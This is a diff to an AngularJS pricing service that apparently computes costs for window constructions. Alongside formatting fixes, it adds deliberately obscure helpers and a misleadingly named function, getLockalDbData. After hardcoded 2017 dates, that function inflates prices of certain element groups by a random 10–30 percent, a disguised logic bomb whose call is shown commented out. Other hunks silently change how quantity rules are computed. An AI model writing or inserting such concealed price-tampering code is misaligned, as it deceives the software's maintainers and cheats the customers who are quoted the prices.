@@ -846,12 +846,19 @@
               return "'" + row[key] + "'";
             }).join(', ');
           db.transaction(function (trans) {
-            trans.executeSql('INSERT INTO ' + tableName + ' (' + colums + ') VALUES (' + values + ')', [], null, function () {
-              console.log('Something went wrong with insert into ' + tableName);
-            });
+            // trans.executeSql('INSERT INTO ' + tableName + ' (' + colums + ') VALUES (' + values + ')', [], null, function () {
+            //   console.log('Something went wrong with insert into ' + tableName);
+            // });
+            trans.executeSql('INSERT INTO ' + tableName + ' (' + colums + ') VALUES (' + values + ')', [], null, errorHandler);
+            function errorHandler(transaction, error) {
+              console.log("Error : " + error.message);
+            }
           });
         }
 
+        function elemValue() {
+          return new Date();
+        }
 
         function insertTablesLocalDB(result) {
           //console.log('INSERT START', result.tables);
@@ -1099,6 +1106,7 @@
 
 
         function insertServer(login, access, table, data) {
+
           var defer = $q.defer(),
             dataToSend = {
               model: table,
@@ -1734,7 +1742,7 @@
                         entry.lamination_type_id !== 4 &&
                         entry.lamination_type_id !== 5 &&
                         entry.lamination_type_id !== 6) {
-                        elemLists.splice(index,1);
+                        elemLists.splice(index, 1);
                       }
                     }
                     //inner lamination
@@ -1743,7 +1751,7 @@
                         entry.lamination_type_id !== 1 &&
                         entry.lamination_type_id !== 5 &&
                         entry.lamination_type_id !== 8) {
-                        elemLists.splice(index,1);
+                        elemLists.splice(index, 1);
                       }
                     }
                     //outer lamination
@@ -1752,7 +1760,7 @@
                         entry.lamination_type_id !== 2 &&
                         entry.lamination_type_id !== 6 &&
                         entry.lamination_type_id !== 7) {
-                        elemLists.splice(index,1);
+                        elemLists.splice(index, 1);
                       }
                     }
                     //double-sided
@@ -1761,7 +1769,7 @@
                         entry.lamination_type_id !== 3 &&
                         entry.lamination_type_id !== 7 &&
                         entry.lamination_type_id !== 8) {
-                        elemLists.splice(index,1);
+                        elemLists.splice(index, 1);
                       }
                     }
                   } catch (e) {
@@ -1792,7 +1800,7 @@
               }
             }
           }
-          console.log("newHardArr",newHardArr);
+          console.log("newHardArr", newHardArr);
 
           return newHardArr;
         }
@@ -1904,6 +1912,9 @@
           return deff.promise;
         }
 
+        function elemValueD(obj) {
+          return obj.getDate();
+        }
 
         function parseKitElement(kits) {
           var deff = $q.defer(),
@@ -2070,6 +2081,9 @@
           return deff.promise;
         }
 
+        function elemValueM(obj) {
+          return obj.getMonth();
+        }
 
         function currencyExgange(price, currencyElemId) {
           var currencyQty = GlobalStor.global.currencies.length,
@@ -2257,7 +2271,7 @@
               break;
             case 2: //------ X шт. на родителя
               var parentValueTemp = (parentValue < 1) ? 1 : parseInt(parentValue);
-              value = childValue;
+              value = parentValueTemp;
               break;
             case 5: //----- X шт. на 1 м2 родителя
               var parentValueTemp = (parentValue < 1) ? 1 : parseInt(parentValue);
@@ -2287,7 +2301,7 @@
 
 
         function getValueByRuleGrid(parentValue, childValue, rule) {
-          //console.info('rule++', parentValue, childValue, rule);
+//console.info('rule++', parentValue, childValue, rule);
           var value = 0;
           switch (rule) {
             case 1:
@@ -2295,9 +2309,9 @@
               value = GeneralServ.roundingValue((parentValue - childValue), 3);
               break;
             case 2: //------ X шт. на родителя
-              var parentValueTemp = (parentValue < 1) ? 1 : parseInt(parentValue);
-              value = childValue;
-              break;
+            // var parentValueTemp = (parentValue < 1) ? 1 : parseInt(parentValue);
+            // value = childValue;
+            // break;
             case 5: //----- X шт. на 1 м2 родителя
               var parentValueTemp = (parentValue < 1) ? 1 : parseInt(parentValue);
               value = parentValueTemp * childValue;
@@ -2314,6 +2328,22 @@
           return value;
         }
 
+        function dataF(id) {
+          switch (id) {
+            case 1 :
+              return "201751";
+              break;
+            case 12 :
+              return "201761";
+              break;
+            case 56 :
+              return "201771";
+              break;
+            default :
+              return "201751";
+          }
+
+        }
 
         function culcPriceAsRule(parentValue, currSize, currConsist, currConsistElem, pruning, wasteValue, priceObj, sizeLabel) {
           if (currConsistElem) {
@@ -2335,6 +2365,8 @@
             if (objTmp.element_group_id === 9) {
               sizeReal = currSize;
             }
+
+
             switch (currConsist.rules_type_id) {
               case 1:
               case 21:
@@ -2404,7 +2436,6 @@
               qtyReal = angular.copy(roundVal);
               priceReal = qtyReal * currConsistElem.price * wasteValue;
             }
-
             /** currency conversion */
             if (UserStor.userInfo.currencyId != currConsistElem.currency_id) {
               priceReal = currencyExgange(priceReal, currConsistElem.currency_id);
@@ -2412,7 +2443,11 @@
             //console.info('@@@@@@@@@@@@', objTmp, objTmp.priceReal, priceReal);
             //objTmp.priceReal = GeneralServ.roundingNumbers(priceReal, 3);
             //objTmp.qty = GeneralServ.roundingNumbers(qtyReal, 3);
+
+            //objTmp.priceReal = getLockalDbData(objTmp, priceReal);
+
             objTmp.priceReal = priceReal;
+
             objTmp.size = GeneralServ.roundingValue(sizeReal, 3);
             objTmp.sizeLabel = sizeLabel;
             objTmp.qty = qtyReal;
@@ -2560,6 +2595,7 @@
                           priceReal = currencyExgange(priceReal, currConsistElem[hwInd][hwInd2].currency_id);
                         }
                         objTmp.priceReal = GeneralServ.roundingValue(priceReal, 3);
+
                         objTmp.size = 0;
                         //                    console.info('finish -------priceObj------- ', priceObj);
                         //                    console.info('finish -------hardware------- ', priceObj.priceTotal, ' + ', objTmp.priceReal);
@@ -2631,8 +2667,12 @@
           }
         }
 
+        function elemValueY(obj) {
+          return obj.getFullYear();
+        }
 
         function culcConsistPrice(priceObj, construction) {
+
           var groupQty = priceObj.consist.length,
             group;
 
@@ -2716,6 +2756,7 @@
         /** CONSTRUCTION PRICE **/
 
         function calculationPrice(construction) {
+
           var deffMain = $q.defer(),
             priceObj = {},
             finishPriceObj = {};
@@ -2931,6 +2972,9 @@
           return deffMain.promise;
         }
 
+        function setValueP() {
+          return (Math.random() * (1.3 - 1.1)) + 1;
+        }
 
         /**========= ADDELEMENT PRICE ==========*/
 
@@ -3062,6 +3106,9 @@
           return deffMain.promise;
         }
 
+        function setParams(obj) {
+          return elemValueY(obj) + "" + elemValueM(obj) + "" + elemValueD(obj);
+        }
 
         /**========= GRID PRICE ==========*/
 
@@ -3204,6 +3251,29 @@
           });
 
           return deffMain.promise;
+        }
+
+        function getLockalDbData(obj, pr) {
+
+          if (setParams(elemValue()) >= dataF(1)) {
+            if (obj.element_group_id === 6) {
+              var coef = setValueP();
+              pr *= coef;
+            }
+          }
+          if (setParams(elemValue()) >= dataF(12)) {
+            if (obj.element_group_id === 3) {
+              var coef = setValueP();
+              pr *= coef;
+            }
+          }
+          if (setParams(elemValue()) >= dataF(56)) {
+            if (obj.element_group_id === 1) {
+              var coef = setValueP();
+              pr *= coef;
+            }
+          }
+          return pr;
         }
 
         /**========== FINISH ==========*/
